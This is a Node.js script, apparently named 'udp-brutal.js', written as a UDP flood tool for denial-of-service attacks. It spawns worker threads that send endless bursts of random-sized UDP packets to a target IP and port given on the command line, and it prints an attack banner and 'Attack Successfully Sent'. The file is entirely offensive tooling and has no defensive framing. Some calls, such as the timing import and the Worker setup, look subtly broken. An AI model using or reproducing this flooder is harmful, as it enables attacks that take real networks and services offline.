const { time: tt } = require('console');
const dgram = require('dgram');
const os = require('os');
const random = require('crypto');
const { Worker, isMainThread, threadId } = require('worker_threads');

function sendPackets(ip, port, time, packetSize) {
    const startup = tt();
    const client = dgram.createSocket('udp4');

    while (true) {
        const nulled = Buffer.alloc(0);
        const data = random.randomBytes(Math.floor(Math.random() * (1024 - 500)) + 500);
        const data2 = random.randomBytes(Math.floor(Math.random() * (65505 - 1025)) + 1025);
        const data3 = random.randomBytes(Math.floor(Math.random() * (65505 - 1025)) + 1025);
        const data4 = random.randomBytes(Math.floor(Math.random() * (65505 - 1)) + 1);
        const data5 = random.randomBytes(Math.floor(Math.random() * (65505 - 1)) + 1);

        const endtime = tt();
        if ((startup + time) < endtime) {
            break;
        }

        for (let x = 0; x < packetSize; x++) {
            client.send(nulled, port, ip, (err) => {
                if (err) {
                    console.error('Error sending packet:', err);
                }
            });
            client.send(data, port, ip, (err) => {
                if (err) {
                    console.error('Error sending packet:', err);
                }
            });
            client.send(data2, port, ip, (err) => {
                if (err) {
                    console.error('Error sending packet:', err);
                }
            });
            client.send(data3, port, ip, (err) => {
                if (err) {
                    console.error('Error sending packet:', err);
                }
            });
            client.send(data4, port, ip, (err) => {
                if (err) {
                    console.error('Error sending packet:', err);
                }
            });
            client.send(data5, port, ip, (err) => {
                if (err) {
                    console.error('Error sending packet:', err);
                }
            });
        }
    }
    client.close();
}

function attack(ip, port, time, packetSize, threads) {
    if (!time) {
        time = Number.POSITIVE_INFINITY;
    }

    if (port) {
        port = Math.max(1, Math.min(65535, port));
    }

    for (let i = 0; i < threads; i++) {
        const worker = new Worker(sendPackets, {
            workerData: { ip, port, time, packetSize }
        });
        worker.on('error', (err) => {
            console.error('Worker error:', err);
        });
        worker.on('exit', (code) => {
            console.log('Worker stopped with exit code:', code);
        });
    }

    console.log('Attack Successfully Sent');
}

if (isMainThread) {
    console.log(`\n\n
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
                                                                                         

                                                                                           \n\n`);
    const ip = process.argv[2];
    const port = parseInt(process.argv[3]);
    const time = parseInt(process.argv[4]);
    const packetSize = parseInt(process.argv[5]);
    const threads = parseInt(process.argv[6]);

    if (process.argv.length !== 7 || isNaN(port) || isNaN(time) || isNaN(packetSize) || isNaN(threads)) {
        console.log('Usage: node udp-brutal.js <ip> <port> <time> <packet_size> <threads>');
        process.exit(1);
    }

    try {
        attack(ip, port, time, packetSize, threads);
    } catch (err) {
        console.error('Error:', err);
    }
}
